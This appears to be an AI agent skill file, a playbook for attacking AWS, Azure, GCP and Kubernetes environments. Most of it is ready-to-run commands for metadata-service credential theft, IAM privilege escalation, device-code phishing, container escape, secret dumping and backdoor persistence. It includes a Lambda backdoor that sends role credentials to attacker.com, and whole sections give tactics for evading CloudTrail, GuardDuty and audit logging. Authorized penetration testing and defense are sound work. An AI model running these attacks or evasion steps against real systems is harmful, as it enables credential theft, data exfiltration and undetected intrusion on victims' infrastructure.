---
name: cloud_exploitation
description: Learn cloud security assessment for AWS, Azure, GCP, and Kubernetes. Covers IAM privilege escalation, metadata service exploitation, container escape, Pacu/CloudFox/Stratus Red Team tooling, and cloud-native detection evasion.
---
# Cloud Exploitation

## When to Use This Skill

- Assessing cloud infrastructure security (AWS, Azure, GCP)
- Exploiting IAM misconfigurations and privilege escalation paths
- Attacking metadata services (IMDS) for credential theft
- Testing Kubernetes clusters for RBAC abuse and container escape
- Enumerating cloud storage (S3, Blob, GCS) for data exfiltration
- Attacking serverless functions (Lambda, Azure Functions, Cloud Functions)
- Using cloud-native attack tools (Pacu, CloudFox, Stratus Red Team)

---

## Concepts

### Cloud Attack Lifecycle

1. **Initial Access** — Compromised credentials, SSRF to metadata, exposed services
2. **Enumeration** — IAM policies, resources, trust relationships
3. **Privilege Escalation** — IAM policy abuse, role chaining, service exploitation
4. **Lateral Movement** — Cross-account access, service pivoting
5. **Persistence** — Backdoor IAM users/roles, Lambda layers, federation
6. **Data Exfiltration** — Storage access, secrets extraction

### Shared Responsibility Model

| Layer | AWS/Azure/GCP Responsibility | Customer Responsibility |
|-------|------------------------------|-------------------------|
| Physical | Data centers, hardware | — |
| Network | Virtual network infrastructure | Security groups, NACLs, firewall rules |
| Identity | IAM service availability | IAM policies, MFA, credential rotation |
| Compute | Hypervisor, bare metal | OS patching, application security |
| Data | Storage service availability | Encryption, access controls, backups |

**Key insight**: ~95% of cloud security failures are customer misconfigurations, not provider vulnerabilities.

---

## AWS Attacks

### Initial Enumeration

**CloudFox** (situational awareness):
```bash
# Configure AWS credentials first
export AWS_PROFILE=target

# All-in-one enumeration
cloudfox aws all-checks --profile target

# Specific modules
cloudfox aws principals           # IAM users, roles
cloudfox aws permissions          # Permission analysis
cloudfox aws env-vars             # Lambda/ECS secrets
cloudfox aws endpoints            # API Gateway, ALBs
cloudfox aws secrets              # Secrets Manager, SSM
cloudfox aws instances            # EC2 with metadata info
cloudfox aws buckets              # S3 enumeration
```

**Pacu** (exploitation framework):
```bash
# Start Pacu
pacu

# Set credentials
Pacu > set_keys
Pacu > whoami                     # Verify identity

# Enumeration modules
Pacu > run iam__enum_users_roles_policies_groups
Pacu > run iam__enum_permissions
Pacu > run ec2__enum
Pacu > run lambda__enum
Pacu > run s3__enum
```

**AWS CLI Enumeration**:
```bash
# Identity
aws sts get-caller-identity

# IAM enumeration
aws iam list-users
aws iam list-roles
aws iam list-attached-user-policies --user-name target
aws iam get-user-policy --user-name target --policy-name policy

# EC2
aws ec2 describe-instances
aws ec2 describe-security-groups

# S3
aws s3 ls
aws s3 ls s3://bucket-name --recursive
```

### Metadata Service Exploitation (IMDS)

**IMDSv1 Exploitation** (via SSRF or shell access):
```bash
# Get instance role credentials (IMDSv1 - no token needed)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# Extract credentials
export AWS_ACCESS_KEY_ID="<AccessKeyId>"
export AWS_SECRET_ACCESS_KEY="<SecretAccessKey>"
export AWS_SESSION_TOKEN="<Token>"

# User data (may contain secrets)
curl http://169.254.169.254/latest/user-data

# Instance identity document
curl http://169.254.169.254/latest/dynamic/instance-identity/document
```

**IMDSv2 Bypass Attempts**:
```bash
# IMDSv2 requires token (harder to exploit via SSRF)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Check if IMDSv1 is disabled
# HttpTokens: required = IMDSv2 only
# HttpTokens: optional = IMDSv1 allowed
```

**Detection**: CloudTrail does not log IMDS access. Look for unusual API calls from EC2 instance roles.

### IAM Privilege Escalation

**Pacu Privilege Escalation Scanner**:
```bash
Pacu > run iam__privesc_scan
# Identifies 21+ privilege escalation paths
```

**Common Escalation Paths**:

| Permission | Escalation Method |
|------------|-------------------|
| `iam:CreatePolicyVersion` | Create new policy version with admin rights |
| `iam:SetDefaultPolicyVersion` | Switch to permissive policy version |
| `iam:AttachUserPolicy` | Attach AdministratorAccess to self |
| `iam:AttachRolePolicy` | Attach admin policy to assumable role |
| `iam:PutUserPolicy` | Add inline policy with admin rights |
| `iam:CreateAccessKey` | Create keys for other users |
| `iam:PassRole` + service | Pass admin role to EC2/Lambda |
| `sts:AssumeRole` | Assume role with higher privileges |
| `lambda:UpdateFunctionCode` | Inject code into Lambda with IAM role |
| `ec2:RunInstances` + `iam:PassRole` | Launch EC2 with admin role |

**iam:CreatePolicyVersion Exploitation**:
```bash
# Create new policy version with admin access
aws iam create-policy-version \
  --policy-arn arn:aws:iam::ACCOUNT:policy/TARGET_POLICY \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default
```

**iam:PassRole + Lambda Exploitation**:
```bash
# Create Lambda with admin role
aws lambda create-function \
  --function-name backdoor \
  --runtime python3.9 \
  --role arn:aws:iam::ACCOUNT:role/AdminRole \
  --handler index.handler \
  --zip-file fileb://function.zip

# Invoke to get credentials
aws lambda invoke --function-name backdoor output.txt
```

### S3 Attacks

**Bucket Enumeration**:
```bash
# Check for public access
aws s3 ls s3://bucket-name --no-sign-request

# List bucket ACL
aws s3api get-bucket-acl --bucket bucket-name

# Check bucket policy
aws s3api get-bucket-policy --bucket bucket-name
```

**Data Exfiltration via Replication**:
```bash
# If you have s3:PutBucketReplication
aws s3api put-bucket-replication \
  --bucket victim-bucket \
  --replication-configuration file://replication.json

# replication.json points to attacker-controlled bucket
```

**Object Versioning for Deleted Data**:
```bash
# List deleted objects
aws s3api list-object-versions --bucket bucket-name

# Retrieve deleted file
aws s3api get-object --bucket bucket-name --key file.txt \
  --version-id "VERSION_ID" recovered.txt
```

### Lambda Exploitation

**Environment Variable Extraction**:
```bash
# Enumerate Lambda functions
aws lambda list-functions
aws lambda get-function --function-name target

# Get environment variables (may contain secrets)
aws lambda get-function-configuration --function-name target \
  --query 'Environment.Variables'

# CloudFox automated extraction
cloudfox aws env-vars
```

**Code Injection** (with `lambda:UpdateFunctionCode`):
```python
# backdoor.py - Exfiltrate role credentials
import os
import urllib.request

def handler(event, context):
    creds = {
        'key': os.environ.get('AWS_ACCESS_KEY_ID'),
        'secret': os.environ.get('AWS_SECRET_ACCESS_KEY'),
        'token': os.environ.get('AWS_SESSION_TOKEN')
    }
    # Exfiltrate credentials
    urllib.request.urlopen(f"https://attacker.com/?creds={creds}")
    return "OK"
```

```bash
# Deploy backdoor
zip function.zip backdoor.py
aws lambda update-function-code \
  --function-name target \
  --zip-file fileb://function.zip
```

### Secrets Manager & SSM Parameter Store

```bash
# List secrets
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id SECRET_NAME

# SSM Parameter Store
aws ssm describe-parameters
aws ssm get-parameter --name /path/to/secret --with-decryption
aws ssm get-parameters-by-path --path /app/ --recursive --with-decryption
```

### EKS Cluster Access

```bash
# List EKS clusters
aws eks list-clusters

# Get kubeconfig
aws eks update-kubeconfig --name cluster-name

# Check accessible
kubectl auth can-i --list
```

### Evasion Considerations

**CloudTrail Blind Spots**:
- IMDS access is not logged
- S3 data events often not enabled
- Some read-only APIs don't log by default

**Reducing Detection**:
```bash
# Use read-only APIs initially
aws iam get-user  # Lower detection than list-users

# Avoid noisy actions
# - Creating new IAM users (high fidelity alert)
# - Disabling CloudTrail (very noisy)
# - Creating access keys for other users

# Blend with legitimate activity timing
```

---

## Azure Attacks

### Initial Enumeration

**Azure CLI**:
```bash
# Login and enumerate
az login
az account list
az account show

# Enumerate resources
az group list
az vm list
az storage account list
az webapp list
az functionapp list
```

**ROADtools** (Entra ID enumeration):
```bash
# Authenticate
roadrecon auth -u user@domain.com -p password
# Or with access token
roadrecon auth --access-token $TOKEN

# Gather data
roadrecon gather

# Start GUI
roadrecon gui

# Export data
roadrecon plugin bloodhound  # BloodHound format
```

**AzureHound** (BloodHound for Azure):
```bash
# Collect with refresh token
azurehound -r $REFRESH_TOKEN list --tenant TENANT_ID -o output.json

# Import to BloodHound
# Upload output.json to BloodHound CE
```

### Managed Identity Exploitation

**Token Theft from Compromised VM/Function**:
```bash
# Azure IMDS endpoint
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Extract token
TOKEN=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  | jq -r '.access_token')

# Use token
az account get-access-token  # Or use directly in API calls
curl -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01"
```

**Token for Different Resources**:
```bash
# Key Vault
resource=https://vault.azure.net

# Storage
resource=https://storage.azure.com

# Microsoft Graph
resource=https://graph.microsoft.com
```

### Token Theft and Manipulation

**Device Code Phishing** (with TokenTactics):
```powershell
# Generate device code
Import-Module TokenTactics
Get-AzureTokenDeviceCode -Client MSGraph

# Victim visits microsoft.com/devicelogin and enters code
# Attacker captures tokens

# Use captured tokens
$tokens = Get-Content tokens.json | ConvertFrom-Json
Connect-AzAccount -AccessToken $tokens.access_token -GraphAccessToken $tokens.graph_token
```

**PRT (Primary Refresh Token) Abuse**:
```bash
# Get nonce from Azure
roadrecon auth --prt-init

# Extract PRT cookie from compromised device
# Use cookie in attacker browser for full session access
```

**Token Refresh for Persistence**:
```powershell
# Refresh token has longer lifetime (~90 days)
# Use TokenTactics to refresh and maintain access
Invoke-RefreshToAzureManagementToken -RefreshToken $RT
Invoke-RefreshToMSGraphToken -RefreshToken $RT
```

### Conditional Access Bypass

| Bypass Technique | Method |
|------------------|--------|
| User-Agent Spoofing | Use unrecognized device platform |
| Client ID Spoofing | Request tokens as desktop app vs browser |
| Resource Tenant Login | Bypass home tenant CA by accessing resource tenant |
| Legacy Auth | Use protocols that don't support MFA |

**User-Agent Bypass**:
```powershell
# TokenTactics with OS/2 user agent (often not in CA policies)
Get-AzureTokenDeviceCode -Client MSGraph -UserAgent "OS/2"
```

### Storage Account Attacks

```bash
# List storage accounts
az storage account list

# Check for public blob access
az storage container list --account-name TARGET --auth-mode key

# Generate SAS token (if you have keys)
az storage blob generate-sas \
  --account-name TARGET \
  --container-name data \
  --name secret.txt \
  --permissions r \
  --expiry 2025-12-31
```

**Insecure SAS Token Abuse**:
```bash
# If you find a SAS token with excessive permissions
# Check expiry and permissions
# Use for data exfiltration
azcopy copy "https://account.blob.core.windows.net/container?SAS_TOKEN" ./local --recursive
```

### Key Vault Exploitation

```bash
# List Key Vaults
az keyvault list

# Get secrets (requires access policy)
az keyvault secret list --vault-name VAULT_NAME
az keyvault secret show --vault-name VAULT_NAME --name SECRET_NAME
```

### Evasion Considerations

**Stealth Enumeration**:
```bash
# ROADtools uses legacy Azure AD Graph API (less monitored than MS Graph)
# But Graph API is being deprecated

# Minimize API calls
# Cache responses locally
```

**Token Usage Patterns**:
- Same token from multiple IPs triggers detection
- Request tokens for minimal scope
- Avoid mass enumeration in short timeframes

---

## GCP Attacks

### Initial Enumeration

```bash
# Authenticate
gcloud auth login
# Or with service account key
gcloud auth activate-service-account --key-file=key.json

# Project enumeration
gcloud projects list
gcloud config set project PROJECT_ID

# IAM
gcloud iam service-accounts list
gcloud projects get-iam-policy PROJECT_ID

# Compute
gcloud compute instances list
gcloud compute firewall-rules list

# Storage
gsutil ls
gsutil ls gs://bucket-name
```

### Metadata Service Exploitation

```bash
# GCP metadata endpoint
curl -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/"

# Service account token
curl -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"

# Service account email
curl -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email"

# Instance attributes (may contain secrets)
curl -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/attributes/"

# Project-wide SSH keys
curl -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/project/attributes/ssh-keys"
```

### Service Account Impersonation

**With iam.serviceAccountTokenCreator**:
```bash
# Generate access token for another service account
gcloud auth print-access-token \
  --impersonate-service-account=target-sa@project.iam.gserviceaccount.com

# Impersonate for all commands
gcloud config set auth/impersonate_service_account target-sa@project.iam.gserviceaccount.com
```

**Privilege Escalation via Impersonation**:
```bash
# If you can impersonate a service account with higher privileges
# Check what SAs you can impersonate
gcloud iam service-accounts get-iam-policy SA_EMAIL --format=json

# Look for roles/iam.serviceAccountTokenCreator bindings
```

### Cloud Functions Abuse

**ConfusedFunction-style Attacks** (if Cloud Build SA is overprivileged):
```bash
# Deploy function that exfiltrates Cloud Build SA credentials
# Cloud Build SA often has excessive permissions

# Check Cloud Build service account permissions
gcloud projects get-iam-policy PROJECT_ID \
  --flatten="bindings[].members" \
  --filter="bindings.members:serviceAccount:*@cloudbuild.gserviceaccount.com"
```

### Storage Bucket Attacks

```bash
# Check bucket ACL
gsutil iam get gs://bucket-name

# Public access check
gsutil ls gs://bucket-name  # Without auth

# Enumerate bucket contents
gsutil ls -r gs://bucket-name

# Download
gsutil cp -r gs://bucket-name ./local
```

### Domain-Wide Delegation Abuse

If a service account has domain-wide delegation:
```python
from google.oauth2 import service_account

# Impersonate any user in the Google Workspace domain
credentials = service_account.Credentials.from_service_account_file(
    'key.json',
    scopes=['https://www.googleapis.com/auth/gmail.readonly'],
    subject='admin@domain.com'  # Impersonate admin
)
# Now access admin's Gmail, Drive, etc.
```

---

## Kubernetes Attacks

### Initial Enumeration

```bash
# Check current context
kubectl config current-context
kubectl auth can-i --list

# Cluster info
kubectl cluster-info
kubectl get nodes

# Enumerate resources
kubectl get pods --all-namespaces
kubectl get secrets --all-namespaces
kubectl get serviceaccounts --all-namespaces
```

### RBAC Exploitation

**Enumerate RBAC**:
```bash
# List roles and bindings
kubectl get roles,clusterroles --all-namespaces
kubectl get rolebindings,clusterrolebindings --all-namespaces

# Check specific role
kubectl describe clusterrole admin

# Find overprivileged service accounts
kubectl auth can-i --list --as=system:serviceaccount:default:default
```

**Common RBAC Privilege Escalations**:

| Permission | Escalation |
|------------|------------|
| `create pods` | Mount secrets, escape to node |
| `create/patch deployments` | Inject privileged containers |
| `get secrets` | Extract all cluster secrets |
| `impersonate users` | Act as cluster-admin |
| `create rolebindings` | Grant yourself cluster-admin |
| `patch clusterroles` | Add permissions to existing roles |

**Create Pod with Cluster-Admin SA**:
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: pwned
spec:
  serviceAccountName: cluster-admin-sa
  containers:
  - name: pwned
    image: alpine
    command: ["sleep", "infinity"]
```

### Secrets Extraction

```bash
# List secrets
kubectl get secrets -n kube-system

# Get secret content (base64 decoded)
kubectl get secret SECRET_NAME -o jsonpath='{.data}' | base64 -d

# Extract all secrets
for ns in $(kubectl get ns -o jsonpath='{.items[*].metadata.name}'); do
  kubectl get secrets -n $ns -o yaml
done
```

### Container Escape

**Privileged Container Escape**:
```bash
# Check if privileged
cat /proc/1/status | grep -i cap
# CapEff: 0000003fffffffff = privileged

# Mount host filesystem
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host
```

**Docker Socket Mount Escape**:
```bash
# If /var/run/docker.sock is mounted
docker run -v /:/host -it alpine chroot /host
```

**CVE-2024-21626 (Leaky Vessels)**:
- Affects runc <= 1.1.11
- Container escape via file descriptor leak
- 80% of cloud environments were vulnerable

**Host Path Mount Abuse**:
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: hostpath-abuse
spec:
  containers:
  - name: pwn
    image: alpine
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
```

### etcd Exploitation

**Direct etcd Access** (if exposed):
```bash
# Read all secrets
ETCDCTL_API=3 etcdctl --endpoints=https://etcd:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get /registry/secrets --prefix

# Bypass RBAC by injecting directly into etcd
# (Most severe, requires etcd access)
```

### Service Account Token Abuse

```bash
# Token location in pod
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Use token externally
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/default/pods
```

### Kubelet API Exploitation

```bash
# If Kubelet API is exposed (port 10250)
# Anonymous auth or valid creds needed

# List pods
curl -k https://node:10250/pods

# Execute in pod
curl -k https://node:10250/run/namespace/pod/container \
  -d "cmd=id"
```

---

## Attack Simulation Tools

### Stratus Red Team

```bash
# Install
brew install stratus-red-team

# List available techniques
stratus list

# AWS techniques
stratus detonate aws.credential-access.ec2-get-password-data
stratus detonate aws.persistence.iam-create-admin-user
stratus detonate aws.defense-evasion.cloudtrail-stop

# Azure techniques
stratus detonate azure.credential-access.storage-account-keys

# Kubernetes techniques
stratus detonate k8s.credential-access.dump-secrets

# Cleanup
stratus cleanup aws.persistence.iam-create-admin-user
```

### Pacu Modules Reference

| Category | Modules |
|----------|---------|
| Enumeration | `iam__enum_*`, `ec2__enum`, `lambda__enum`, `s3__enum` |
| Privilege Escalation | `iam__privesc_scan`, `iam__backdoor_*` |
| Persistence | `iam__backdoor_users_keys`, `lambda__backdoor_new_*` |
| Credential Access | `iam__enum_permissions`, `systemsmanager__get_*` |
| Exfiltration | `s3__download_bucket`, `rds__explore_snapshots` |

---

## Cloud Security Workflows

### AWS Enumeration to Admin Workflow

1. **Identify initial access**:
   ```bash
   aws sts get-caller-identity
   ```

2. **Enumerate IAM permissions**:
   ```bash
   cloudfox aws permissions --profile target
   # Or
   Pacu > run iam__enum_permissions
   ```

3. **Check privilege escalation paths**:
   ```bash
   Pacu > run iam__privesc_scan
   ```

4. **Exploit identified path**:
   ```bash
   # Example: CreatePolicyVersion
   aws iam create-policy-version --policy-arn ARN \
     --policy-document file://admin.json --set-as-default
   ```

5. **Establish persistence**:
   ```bash
   # Create backdoor access key
   Pacu > run iam__backdoor_users_keys
   ```

6. **Access high-value resources**:
   ```bash
   aws secretsmanager list-secrets
   aws s3 sync s3://sensitive-bucket ./exfil
   ```

### Azure Token Attack Workflow

1. **Obtain initial token** (phishing, leaked creds, SSRF):
   ```powershell
   # Device code phishing
   Get-AzureTokenDeviceCode -Client MSGraph
   ```

2. **Enumerate with token**:
   ```bash
   roadrecon auth --access-token $TOKEN
   roadrecon gather
   ```

3. **Identify attack paths**:
   ```bash
   roadrecon gui
   # Or import to BloodHound
   ```

4. **Escalate privileges**:
   - Application consent abuse
   - Role assignment modification
   - Service principal abuse

5. **Extract secrets**:
   ```bash
   az keyvault secret list --vault-name TARGET
   az storage blob download-batch -s container -d ./exfil
   ```

### Kubernetes Compromise Workflow

1. **Gain pod access** (web exploit, misconfigured ingress):
   ```bash
   kubectl exec -it pod-name -- /bin/bash
   ```

2. **Check service account permissions**:
   ```bash
   kubectl auth can-i --list
   ```

3. **Extract secrets**:
   ```bash
   kubectl get secrets -o yaml
   ```

4. **Attempt container escape**:
   ```bash
   # Check for privileged mode, host mounts
   mount | grep -i host
   ls -la /var/run/docker.sock
   ```

5. **Pivot to node/cluster**:
   ```bash
   # If escape successful, access node credentials
   cat /host/etc/kubernetes/admin.conf
   ```

6. **Establish persistence**:
   ```yaml
   # Create DaemonSet for persistence
   kubectl apply -f backdoor-daemonset.yaml
   ```

### Multi-Cloud Assessment Workflow

1. **Discover cloud assets**:
   - DNS enumeration for cloud endpoints
   - Certificate transparency logs
   - GitHub/GitLab for exposed credentials

2. **Test each platform**:
   ```bash
   # AWS
   cloudfox aws all-checks

   # Azure
   roadrecon gather

   # GCP
   gcloud projects list
   ```

3. **Cross-cloud pivoting**:
   - AWS credentials in Azure Key Vault
   - GCP service account keys in S3
   - Kubernetes secrets containing cloud credentials

4. **Document findings** with business impact context

---

## Evasion Techniques

### CloudTrail Evasion (AWS)

**Non-logged or Less-monitored APIs**:
- IMDS access (completely invisible)
- S3 data events (often not enabled)
- Some `Get*` and `Describe*` calls

**Blend with Legitimate Activity**:
- Time attacks during business hours
- Use same regions as normal operations
- Avoid bulk enumeration

### Avoiding GuardDuty Detection

| Detection | Evasion |
|-----------|---------|
| Unusual API calls | Use common APIs, avoid rare operations |
| Credential exfiltration | Use credentials from expected IP ranges |
| S3 anomalies | Slow exfiltration, match normal patterns |
| DNS exfiltration | Use legitimate DNS services |

### Azure Detection Evasion

- Use Azure AD Graph API (less monitored, being deprecated)
- Avoid mass Graph API enumeration
- Token rotation to avoid pattern detection
- Use legitimate-looking application registrations

### Kubernetes Detection Evasion

- Avoid creating obvious resources (named "backdoor", etc.)
- Use existing service accounts when possible
- Blend audit log entries with normal activity
- Use kubectl proxy for local API access (reduces network signatures)
